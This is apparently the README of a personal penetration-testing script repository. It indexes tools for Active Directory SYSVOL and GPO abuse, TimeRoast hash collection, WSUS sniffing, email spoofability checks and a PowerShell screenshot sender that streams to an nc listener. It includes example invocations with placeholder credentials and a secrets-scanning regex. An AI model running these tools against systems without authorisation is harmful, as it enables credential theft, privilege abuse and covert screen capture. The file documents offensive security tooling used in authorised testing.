# HacknScripts

Random pentest and lab scripts. Some are polished enough to reuse, some are quick helpers from real testing workflows.

Most scripts are organized by category. A small number of root-level scripts are kept for existing blog/writeup links.

## Quick Index

| Area | Script | What it does |
| --- | --- | --- |
| Network | `deCIDR.sh` / `network/deCIDR.sh` | Expands CIDR blocks, IP ranges, single IPs, and hostnames into `deCIDRd.out`. Uses `nmap -sL`. |
| Network | `network/superspoof.sh` | Uses Microsoft tenant/domain discovery, MX lookup, and Spoofy to check SPF/DMARC spoofability. |
| AD/SYSVOL | `ad/sysvol/parse_sysvol.py` | Parses cloned SYSVOL GPO content for software installs, drive maps, scripts, and BloodHound correlation. |
| AD/SYSVOL | `ad/sysvol/smb_sysvol_probe.py` | Authenticates over SMB and probes SYSVOL/Policies without relying on share listing. |
| AD/SYSVOL | `ad/sysvol/machine_pwd_policy_probe.sh` | Uses manspider to pull SYSVOL policy files and summarize machine account password policy settings. |
| AD/SYSVOL | `ad/sysvol/link_gpo.py` | Links a GPO to an OU over LDAPS when you have WriteGPLink rights; supports restore using saved gPLink. |
| AD/SYSVOL | `ad/sysvol/trust_comp_enum.py` | LDAP/LDAPS trust enumeration plus computer `pwdLastSet`/creation age checks. |
| AD/WSUS | `ad/wsus/WSUSniff.py` | Sniffs HTTP WSUS traffic and logs servers, clients, and matched WSUS endpoints. |
| AD/WSUS | `ad/wsus/wsuspider.sh` | Uses manspider and regpol to find WSUS registry policy settings in SYSVOL. |
| AD/WSUS | `ad/wsus/wsus_auto_spider.sh` | Older positional-argument WSUS policy extractor. Prefer `wsuspider.sh` for newer usage. |
| AD/TimeRoast | `ad/timeroast/timeroast2.py` | Current-secret MS-SNTP TimeRoast hash collector for Hashcat mode 31300. |
| AD/TimeRoast | `ad/timeroast/timeroast_expand.py` | Expands digit-run hostname patterns for candidate generation. |
| Remote Windows | `remote-windows/cimstat.py` | Reads remote file or directory metadata through WinRM/CIM without spawning PowerShell. |
| Remote Windows | `remote-windows/screenshotter.ps1` | Captures desktop screenshots and sends them to a TCP listener. |
| Remote Windows | `remote-windows/screenshotter_receive.sh` | Receives raw screenshot files over `nc` into `output_images/`. |
| Remote Windows | `remote-windows/gimme_images.sh` | Receives base64 image blobs over `nc`, decodes them on Ctrl+C, and writes `output_images/`. |
| Remote Windows | `remote-windows/send_images.sh` | Test helper for sending local images to a listener. |
| Lab | `newBoxScript.sh` / `lab/newBoxScript.sh` | Kali/qterminal/xdotool helper for fresh CTF-style box enumeration. |

## Examples

```bash
# Expand CIDRs/ranges/hosts into deCIDRd.out
bash deCIDR.sh targets.txt

# Check spoofability for a domain
bash network/superspoof.sh example.com

# Parse a SYSVOL clone and correlate with BloodHound JSON
python3 ad/sysvol/parse_sysvol.py all -s ./sysvol -b ./bloodhound

# Probe SYSVOL over SMB
python3 ad/sysvol/smb_sysvol_probe.py -H dc1.example.local --ip 192.0.2.10 -d example.local -u USER -p 'PASS' --show-gpt

# Pull and summarize machine password policy settings from SYSVOL
bash ad/sysvol/machine_pwd_policy_probe.sh -dc-ip 192.0.2.10 -d example.local -u USER -p 'PASS' -l ./loot_sysvol

# List OUs before linking a GPO
python3 ad/sysvol/link_gpo.py -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --list-ous

# Sniff WSUS traffic
sudo python3 ad/wsus/WSUSniff.py -i eth0 -p 8530

# Extract WSUS policy settings from SYSVOL
bash ad/wsus/wsuspider.sh -dc-ip 192.0.2.10 -d example.local -u USER -p 'PASS' --no-banner

# TimeRoast a DC and save Hashcat 31300 lines
python3 ad/timeroast/timeroast2.py dc1.example.local -o timeroast_hashes.txt -r "512-1200"

# Expand digit-run host patterns
python3 ad/timeroast/timeroast_expand.py hosts.txt -o expanded_hosts.txt

# Read remote file metadata over WinRM/CIM
python3 remote-windows/cimstat.py dc1.example.local -d example.local -u USER -p 'PASS' -f 'C:\Windows\System32\notepad.exe'

# Screenshot receiver and sender test helper
bash remote-windows/screenshotter_receive.sh 4444
powershell -ExecutionPolicy Bypass -File .\screenshotter.ps1 -Count 5 -Interval 10 -DestIP 192.0.2.10 -DestPort 4444
bash remote-windows/send_images.sh 192.0.2.10 4444 ./images
```

## Dependency Notes

Common external tools used across scripts include `nmap`, `nc`, `manspider`, `regpol`, `ldap3`, `impacket`, `scapy`, `pypsrp`, `rustscan`, `ffuf`, `xdotool`, `qterminal`, `Spoofy`, and `msftrecon`.

Install only what you need for the script you are running. Several scripts assume Kali-style paths or tooling and may need local path edits.

## Sensitive Info Check

Current cleanup performed:

- Removed a hardcoded private destination IP from `send_images.sh`; it now requires `<dest-ip> <dest-port> [source-dir]`.
- Replaced concrete-looking `link_gpo.py` example credentials/domain/IP with placeholders and documentation-range IPs.
- Removed an accidental shell transcript line from `smb_sysvol_probe.py`.

Run a quick local recheck with:

```bash
rg -n --hidden -g '!.git/**' -i 'password01|api[_-]?key|client[_-]?secret|bearer|authorization:|BEGIN (RSA|OPENSSH|PRIVATE)|ghp_|github_pat_|xox[baprs]-|192\.168\.|10\.129\.|woke\.local' .
```

Expect some benign hits for private-range example IPs in usage text.

## Layout

Root keeps `deCIDR.sh` and `newBoxScript.sh` for older blog/writeup links. The categorized copies are the canonical organization for the rest of the collection.

```text
network/
  deCIDR.sh
  superspoof.sh
ad/sysvol/
  parse_sysvol.py
  smb_sysvol_probe.py
  machine_pwd_policy_probe.sh
  link_gpo.py
  trust_comp_enum.py
ad/wsus/
  WSUSniff.py
  wsuspider.sh
  wsus_auto_spider.sh
ad/timeroast/
  timeroast2.py
  timeroast_expand.py
remote-windows/
  cimstat.py
  screenshotter.ps1
  screenshotter_receive.sh
  gimme_images.sh
  send_images.sh
lab/
  newBoxScript.sh
```

## Disclaimer

Use only in environments where you have authorization. Some scripts are noisy, lab-oriented, or make assumptions about local tooling and paths.
